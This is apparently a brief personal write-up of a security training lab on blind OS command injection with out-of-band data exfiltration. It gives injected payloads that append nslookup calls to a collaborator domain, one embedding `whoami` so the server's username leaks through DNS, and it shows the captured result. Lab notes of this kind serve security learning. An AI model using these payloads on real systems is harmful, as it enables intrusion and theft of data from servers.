## Blind OS command injection with out-of-band data exfiltration
Vuln: executes a shell command containing the user-supplied details
    -asynchronus
    -not possible to redirect output into a location that you can access.
soln:
& nslookup 2uxesrnshp02ri17pclzzswrwi29qzeo.oastify.com #

& nslookup `whoami`.2uxesrnshp02ri17pclzzswrwi29qzeo.oastify.com #

O/p: peter-oEl6Gp.2uxesrnshp02ri17pclzzswrwi29qzeo.oastify.com